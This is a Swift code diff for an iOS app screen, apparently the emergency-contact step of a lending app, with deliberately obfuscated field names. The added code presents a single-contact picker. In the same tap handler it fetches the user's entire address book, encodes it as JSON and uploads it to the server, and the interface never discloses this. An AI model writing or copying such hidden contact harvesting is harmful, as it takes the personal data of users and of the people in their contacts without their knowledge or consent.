@@ -8,15 +8,19 @@
 import UIKit
 import TYAlertController
 
-class PersonalViewController: BaseViewController {
+class LoveLifeViewController: BaseViewController {
     
     var productID: String = ""
     
     var pagetitle: String = ""
     
-    let viewModel = PersonalViewModel()
+    let viewModel = LoveLifeViewModel()
     
     var model: BaseModel?
+    
+    let manager = ContactsManager()
+    
+    var phoneDictArray: [[String: String]] = []
     
     lazy var stepView: StepView = {
         let stepView = StepView()
@@ -46,8 +50,7 @@ class PersonalViewController: BaseViewController {
         let tableView = UITableView(frame: .zero, style: .plain)
         tableView.separatorStyle = .none
         tableView.backgroundColor = UIColor.init(hexString: "#F2F8FC")
-        tableView.register(InputTextCell.self, forCellReuseIdentifier: "InputTextCell")
-        tableView.register(ClickTextCell.self, forCellReuseIdentifier: "ClickTextCell")
+        tableView.register(LoveLifeViewCell.self, forCellReuseIdentifier: "LoveLifeViewCell")
         tableView.estimatedRowHeight = 80
         tableView.showsVerticalScrollIndicator = false
         tableView.contentInsetAdjustmentBehavior = .never
@@ -56,10 +59,10 @@ class PersonalViewController: BaseViewController {
         tableView.dataSource = self
         return tableView
     }()
-
+    
     override func viewDidLoad() {
         super.viewDidLoad()
-
+        
         // Do any additional setup after loading the view.
         view.backgroundColor = UIColor.init(hexString: "#0073E5")
         view.addSubview(headView)
@@ -86,8 +89,9 @@ class PersonalViewController: BaseViewController {
         
         viewModel.detailModel.asObservable().subscribe(onNext: { [weak self] model in
             guard let self = self, let model = model else { return }
-            stepView.modelArray = model.ande?.beakful ?? []
-            stepView.setCurrentIndex(1, animated: false)
+            let modelArray = model.ande?.beakful ?? []
+            stepView.modelArray = modelArray
+            stepView.setCurrentIndex(modelArray.count - 2, animated: false)
         }).disposed(by: disposeBag)
         
         view.addSubview(whiteView)
@@ -118,18 +122,24 @@ class PersonalViewController: BaseViewController {
         }
         
         nextBtn.rx.tap.subscribe(onNext: { [weak self] in
-            guard let self = self, let modelArray = self.model?.ande?.revolutionised else { return }
+            guard let self = self, let modelArray = self.model?.ande?.roosing else { return }
             var dict = ["fuckups": productID]
+            phoneDictArray.removeAll()
             modelArray.forEach { model in
-                guard let key = model.larcenable else { return }
-                if model.ranivorous == "Munday" {
-                    let derailer = model.derailer ?? 0
-                    derailer == 0 ? (dict[key] = "") : (dict[key] = String(derailer))
-                } else {
-                    dict[key] = model.whens ?? ""
-                }
+                let dict = ["banshees": model.banshees ?? "",
+                            "carmela": model.carmela ?? "",
+                            "semaphorically": model.semaphorically ?? ""]
+                self.phoneDictArray.append(dict)
             }
-            safeInfo(with: dict)
+            do {
+                let jsonData = try JSONSerialization.data(withJSONObject: phoneDictArray, options: [])
+                if let jsonString = String(data: jsonData, encoding: .utf8) {
+                    dict["ande"] = jsonString
+                    safeInfo(with: dict)
+                }
+            }catch {
+                
+            }
         }).disposed(by: disposeBag)
         
     }
@@ -142,10 +152,10 @@ class PersonalViewController: BaseViewController {
             ToastShowMessage.showToast(message: model.hypsodonty ?? "")
         }
     }
-
+    
 }
 
-extension PersonalViewController: UITableViewDelegate, UITableViewDataSource {
+extension LoveLifeViewController: UITableViewDelegate, UITableViewDataSource {
     
     func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
         return 0.01
@@ -157,65 +167,69 @@ extension PersonalViewController: UITableViewDelegate, UITableViewDataSource {
     }
     
     func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
-        return self.model?.ande?.revolutionised?.count ?? 0
+        return self.model?.ande?.roosing?.count ?? 0
     }
     
     func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
-        let model = self.model?.ande?.revolutionised?[indexPath.row]
-        let ranivorous = model?.ranivorous ?? ""
-        if ranivorous == "seriosities" {
-            let cell = tableView.dequeueReusableCell(withIdentifier: "InputTextCell", for: indexPath) as! InputTextCell
-            cell.backgroundColor = .clear
-            cell.selectionStyle = .none
-            cell.authModel = model
-            return cell
-        }else {
-            let cell = tableView.dequeueReusableCell(withIdentifier: "ClickTextCell", for: indexPath) as! ClickTextCell
-            cell.backgroundColor = .clear
-            cell.selectionStyle = .none
-            cell.authModel = model
-            cell.clickBtn.rx.tap.subscribe(onNext: { [weak self] in
-                guard let self = self, let model = model else { return }
-                cellClickModel(with: model, cell: cell)
-            }).disposed(by: disposeBag)
-            return cell
+        let model = self.model?.ande?.roosing?[indexPath.row]
+        let cell = tableView.dequeueReusableCell(withIdentifier: "LoveLifeViewCell", for: indexPath) as! LoveLifeViewCell
+        cell.backgroundColor = .clear
+        cell.selectionStyle = .none
+        cell.model = model
+        cell.clickBtn.rx.tap.subscribe(onNext: { [weak self] in
+            guard let self = self, let model = model else { return }
+            cellClickModel(with: model, cell: cell)
+        }).disposed(by: disposeBag)
+        
+        cell.clickPhoneBtn.rx.tap.subscribe(onNext: { [weak self] in
+            guard let self = self, let model = model else { return }
+            
+            manager.fetchAllContacts(from: self) { contacts in
+                let encoder = JSONEncoder()
+                encoder.outputFormatting = .prettyPrinted
+                do {
+                    let data = try encoder.encode(contacts)
+                    let jsonStr = String(data: data, encoding: .utf8) ?? ""
+                    print("jsonStr========\(jsonStr)")
+                    let dict = ["ande": jsonStr]
+                    self.viewModel.pushMessageInfo(to: dict)
+                } catch {
+                    print("JSONERROR=========\(error)")
+                }
+            }
+            
+            manager.pickSingleContact(from: self) { contact in
+                if let c = contact {
+                    cell.phoneNumberTx.text = "\(c.banshees)-\(c.anthemwise)"
+                    model.whens = c.banshees
+                    model.semaphorically = c.anthemwise
+                } else {
+                    print("CANCEL========CANCEL")
+                }
+            }
+            
+        }).disposed(by: disposeBag)
+        return cell
+    }
+    
+    private func cellClickModel(with model: revolutionisedModel, cell: LoveLifeViewCell) {
+        let popEnumView = PopEnmuView(frame: self.view.frame)
+        popEnumView.model = model
+        let alertVc = TYAlertController(alert: popEnumView, preferredStyle: .actionSheet)!
+        self.present(alertVc, animated: true)
+        popEnumView.cancelBtn.rx.tap.subscribe(onNext: { [weak self] in
+            self?.dismiss(animated: true)
+        }).disposed(by: disposeBag)
+        
+        popEnumView.sureBlock = { index in
+            self.dismiss(animated: true) {
+                cell.phoneTx.text = model.scalping?[index].banshees ?? ""
+                let derailer = model.scalping?[index].derailer ?? 0
+                cell.model?.carmela = derailer == 0 ? "" : String(model.scalping?[index].derailer ?? 0)
+            }
         }
     }
     
-    private func cellClickModel(with model: revolutionisedModel, cell: ClickTextCell) {
-        self.view.endEditing(true)
-        let ranivorous = model.ranivorous ?? ""
-        if ranivorous == "Munday" {
-            let popEnumView = PopEnmuView(frame: self.view.frame)
-            popEnumView.model = model
-            let alertVc = TYAlertController(alert: popEnumView, preferredStyle: .actionSheet)!
-            self.present(alertVc, animated: true)
-            popEnumView.cancelBtn.rx.tap.subscribe(onNext: { [weak self] in
-                self?.dismiss(animated: true)
-            }).disposed(by: disposeBag)
-            
-            popEnumView.sureBlock = { index in
-                self.dismiss(animated: true) {
-                    cell.phoneTx.text = model.scalping?[index].banshees ?? ""
-                    cell.authModel?.derailer = model.scalping?[index].derailer ?? 0
-                }
-            }
-        }else {
-            let popCityView = PopCityView(frame: self.view.frame)
-            popCityView.model = CityInfoModel.shared.cityModel
-            let alertVc = TYAlertController(alert: popCityView, preferredStyle: .actionSheet)!
-            self.present(alertVc, animated: true)
-            popCityView.cancelBtn.rx.tap.subscribe(onNext: { [weak self] in
-                self?.dismiss(animated: true)
-            }).disposed(by: disposeBag)
-            
-            popCityView.sureBlock = { city in
-                self.dismiss(animated: true) {
-                    cell.phoneTx.text = city
-                    cell.authModel?.whens = city
-                }
-            }
-        }
-    }
+    
     
 }
